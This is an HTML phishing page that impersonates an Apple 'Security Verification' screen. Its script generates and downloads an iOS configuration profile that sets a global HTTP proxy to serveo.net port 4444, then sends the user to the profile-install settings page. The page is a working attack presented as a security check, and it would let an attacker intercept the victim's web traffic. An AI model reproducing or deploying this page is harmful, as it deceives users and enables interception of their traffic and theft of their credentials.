<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #1c1c1e; color: white; display: flex; align-items: center; justify-content: center; text-align: center; }
        .container { background: white; color: black; padding: 40px; border-radius: 25px; width: 80%; max-width: 350px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .apple-logo { width: 40px; margin-bottom: 20px; }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; margin-bottom: 30px; }
        .btn { background: #007aff; color: white; padding: 15px 25px; border-radius: 12px; text-decoration: none; font-weight: 600; display: block; cursor: pointer; border: none; width: 100%; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
        <h1>Identity Required</h1>
        <p>To continue, please verify your device management profile.</p>
        <button onclick="downloadProfile()" class="btn">Install Verification Profile</button>
    </div>

    <script>
        function downloadProfile() {
            // Your EXACT XML Payload from the screenshot
            const profileXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Identity Verification for Hadima Closet Archives</string>
            <key>PayloadDisplayName</key>
            <string>Hadima Verification Certificate</string>
            <key>PayloadIdentifier</key>
            <string>com.apple.proxy.setup</string>
            <key>PayloadType</key>
            <string>com.apple.proxy.http</string>
            <key>PayloadUUID</key>
            <string>12345-67890</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>ProxyServer</key>
            <string>serveo.net</string>
            <key>ProxyPort</key>
            <integer>4444</integer>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Hadima Identity Service</string>
    <key>PayloadIdentifier</key>
    <string>com.hadima.verify</string>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>09876-54321</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>`;

            const blob = new Blob([profileXml], { type: 'application/x-apple-aspen-config' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = 'verify.mobileconfig';
            document.body.appendChild(a);
            a.click();
            
            setTimeout(() => {
                window.URL.revokeObjectURL(url);
                window.location.href = "App-prefs:General&path=ManagedConfigurationList";
            }, 3000);
        }
    </script>
</body>
</html>
